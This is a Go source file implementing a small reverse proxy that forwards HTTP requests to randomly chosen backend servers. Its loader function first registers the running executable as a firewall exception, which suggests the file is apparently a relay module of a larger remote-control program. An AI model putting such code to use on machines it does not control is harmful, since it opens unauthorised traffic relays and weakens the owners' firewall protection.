package components

import (
	"fmt"
	"math/rand"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const (
	defaultServerTimeOut = 30
)

type (
	backendServer struct {
		Proxy *httputil.ReverseProxy
		URL   *url.URL
	}
)

var (
	port           string
	backends       string
	backendServers []*backendServer
)

func handle(w http.ResponseWriter, req *http.Request) {
	backendServer, err := getBackendServer()
	if err != nil {
		fmt.Fprint(w, err.Error())
		return
	}

	newDebugUpdate("Proxying request for " + req.URL.String() + " to backend server with address: " + backendServer.URL.String())

	backendServer.Proxy.ServeHTTP(w, req)
}

func getBackendServer() (*backendServer, error) {
	if len(backendServers) == 0 {
		return nil, fmt.Errorf("No backend servers available :(")
	}

	return backendServers[rand.Intn(len(backendServers))], nil
}

func parseBackends() {
	splitBackends := strings.Split(backends, ",")

	for _, backend := range splitBackends {
		backend = strings.Trim(backend, " ")

		match, _ := regexp.MatchString("^(?:https?:)?//", backend)
		if match == false {
			backend = "http://" + backend
		}

		backendURL, err := url.Parse(backend)
		if err != nil || len(backend) == 0 {
			continue
		}

		backendServer := &backendServer{
			Proxy: httputil.NewSingleHostReverseProxy(backendURL),
			URL:   backendURL,
		}

		backendServers = append(backendServers, backendServer)
	}

}

func startProxServer() {
	mux := http.NewServeMux()

	server := &http.Server{}

	server.Addr = ":" + port
	server.Handler = mux
	server.ReadTimeout = time.Duration(defaultServerTimeOut) * time.Second
	server.WriteTimeout = time.Duration(defaultServerTimeOut) * time.Second

	mux.Handle("/", http.HandlerFunc(handle))

	newDebugUpdate("Proxy Server running on port " + port)

	go server.ListenAndServe()
}

func proxSrvLoad(myport, yourbackends string) {
	if addtoFirewall(myName, os.Args[0]) {
	}
	port = myport
	backends = yourbackends

	parseBackends()

	startProxServer()
}
